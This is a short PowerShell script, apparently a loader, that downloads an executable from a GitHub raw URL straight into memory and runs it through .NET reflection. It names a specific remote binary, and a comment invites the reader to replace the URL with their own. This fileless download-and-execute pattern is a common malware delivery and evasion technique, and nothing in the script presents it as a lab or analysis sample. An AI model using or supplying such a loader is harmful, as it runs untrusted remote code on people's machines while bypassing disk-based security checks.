# Download the compiled C++ executable into memory
$webClient = New-Object System.Net.WebClient
$binaryUrl = "https://raw.githubusercontent.com/DemonT-T/fsda/refs/heads/main/WexizeRevamp.exe" # Replace with your executable URL
$binaryData = $webClient.DownloadData($binaryUrl)

# Use reflection to load and execute the binary in memory
$assembly = [System.Reflection.Assembly]::Load($binaryData)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
